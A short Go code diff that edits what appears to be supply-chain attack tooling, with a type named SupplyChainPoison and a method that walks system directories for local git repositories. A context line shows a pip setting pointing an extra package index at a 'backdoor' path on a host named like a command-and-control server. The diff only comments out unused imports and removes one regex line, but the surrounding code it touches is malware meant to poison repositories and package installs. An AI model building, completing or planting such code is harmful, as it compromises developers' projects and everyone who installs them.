@@ -4,9 +4,9 @@ import (
 	"encoding/json"
 	"fmt"
 	"os"
-	"os/exec"
+	// "os/exec"
 	"path/filepath"
-	"regexp"
+	// "regexp"
 	"strings"
 )
 
@@ -163,7 +163,7 @@ extra-index-url = http://x404x-c2.online/pypi/backdoor/
 import (
 	"fmt"
 	"os"
-	"os/exec"
+	// "os/exec"
 	"syscall"
 )
 
@@ -261,7 +261,6 @@ func (sp *SupplyChainPoison) FindLocalRepos() []string {
 		"/opt/",
 	}
 
-	gitDir := regexp.MustCompile(`\.git$`)
 	for _, base := range searchPaths {
 		filepath.Walk(base, func(path string, info os.FileInfo, err error) error {
 			if err != nil {
